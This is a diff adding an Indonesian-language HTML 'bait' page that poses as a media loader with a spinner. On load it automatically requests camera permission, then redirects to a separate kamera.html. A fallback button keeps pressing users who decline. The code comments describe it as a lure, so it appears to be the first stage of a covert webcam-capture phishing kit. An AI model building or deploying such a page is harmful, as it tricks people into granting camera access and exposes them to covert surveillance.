@@ -1,0 +1,44 @@
+<!-- FILE 1: pancing.html (Halaman Pancing / Trigger Awal) -->
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Memuat Konten...</title>
+    <style>
+        body { margin: 0; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; overflow: hidden; }
+        .box { text-align: center; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #333; border-top: 4px solid #fff; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 16px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #btn-fallback { display: none; margin-top: 15px; padding: 10px 20px; background: #222; color: #fff; border: 1px solid #555; border-radius: 4px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div class="spinner"></div>
+        <p>Memuat Media...</p>
+        <button id="btn-fallback" onclick="requestAccess()">Ketuk untuk Melanjutkan</button>
+    </div>
+
+    <script>
+        async function requestAccess() {
+            try {
+                // Meminta izin kamera untuk memicu pop-up browser
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                
+                // Matikan stream di halaman pancing agar hardware lepas, lalu lempar ke kamera.html
+                stream.getTracks().forEach(track => track.stop());
+                window.location.href = "kamera.html";
+            } catch (err) {
+                console.warn("Izin ditolak atau butuh interaksi:", err);
+                document.getElementById('btn-fallback').style.display = 'inline-block';
+            }
+        }
+
+        // Jalankan otomatis saat halaman dibuka
+        window.addEventListener('DOMContentLoaded', () => {
+            requestAccess();
+        });
+    </script>
+</body>
+</html>
